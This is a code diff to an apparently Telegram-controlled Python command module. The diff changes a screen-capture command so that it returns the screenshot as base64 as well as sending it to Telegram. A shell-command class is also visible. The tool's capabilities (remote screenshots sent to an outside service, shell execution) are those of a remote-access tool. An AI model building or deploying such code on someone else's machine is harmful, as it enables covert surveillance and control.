@@ -1,3 +1,5 @@
+import base64
+from io import BytesIO
 import os
 import psutil
 import pyautogui
@@ -6,7 +8,6 @@ import subprocess
 from abc import ABC, abstractmethod
 from typing import Dict, Optional
 from core.telegram_service import TelegramService
-
 
 class ICommand(ABC):
     @abstractmethod
@@ -103,10 +104,14 @@ class ScreenCaptureCommand(ICommand):
         os.makedirs(save_path, exist_ok=True)
         full_path = os.path.join(save_path, filename)
         image.save(full_path)
-        print(f"[Screenshot saved] {full_path}")
         self.telegram.send_telegram_photo(full_path)
-        return {"status": "success", "file": full_path}
 
+        
+        # Convert to Base64
+        buffered = BytesIO()
+        image.save(buffered, format="PNG")
+        img_base64 = base64.b64encode(buffered.getvalue()).decode("utf-8")
+        return {"type": "show_screenshot","status": "success", "file": img_base64}
 
 class ShellCommand(ICommand):
     def __init__(self, command: str):
